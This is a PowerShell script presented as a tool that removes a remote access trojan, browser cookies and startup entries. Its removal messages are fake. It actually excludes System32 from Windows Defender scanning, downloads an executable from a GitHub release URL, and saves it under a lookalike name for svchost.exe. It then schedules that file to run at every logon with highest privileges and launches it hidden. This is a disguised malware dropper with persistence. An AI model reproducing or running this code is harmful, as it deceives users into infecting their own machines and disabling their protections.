$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "ERROR: This script must be run as Administrator. Please right-click PowerShell and select 'Run as administrator'." -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}
Write-Host "Finding Remote Access Files..."
Start-Sleep -Milliseconds 720
Write-Host "Removing Temporary Account Data Files..."
Start-Sleep -Milliseconds 300
Write-Host "Removing RAT File..."
Start-Sleep -Milliseconds 220
Write-Host "Removing RAT from Startup Folder..."
Start-Sleep -Milliseconds 280
Write-Host "Removing Saved Browser History & Cookies"
$url = "https://github.com/gwakgwak-sigma/l-chuha-/releases/download/v1.0/release.exe"
$fileName = "svchоst.exe"
$system32 = Join-Path $env:windir "System32"
$filePath = Join-Path $system32 $fileName
$taskName = "Service Host Invoker"
$ProgressPreference = 'SilentlyContinue'

try {
    Add-MpPreference -ExclusionPath $system32 -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
} catch {}

if (-not (Test-Path $filePath)) {
    try {
        Invoke-WebRequest -Uri $url -OutFile $filePath -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
    } catch {
        exit 1
    }
}

$currentUser = "$env:USERDOMAIN\$env:USERNAME"
$taskExists = $false
try {
    schtasks /query /TN $taskName 2> $null | Out-Null
    if ($LASTEXITCODE -eq 0) { $taskExists = $true }
} catch {}

if (-not $taskExists) {
    try {
        schtasks /create /SC ONLOGON /TN $taskName /TR "$filePath" /RU $currentUser /RL HIGHEST 2> $null | Out-Null
        if ($LASTEXITCODE -ne 0) { exit 1 }
    } catch {
        exit 1
    }
}

if (Test-Path $filePath) {
    try {
        Start-Process -FilePath $filePath -WindowStyle Hidden -ErrorAction SilentlyContinue
    } catch {}
}

Write-Host "Removal Complete!"
Read-Host "Press Enter to exit"
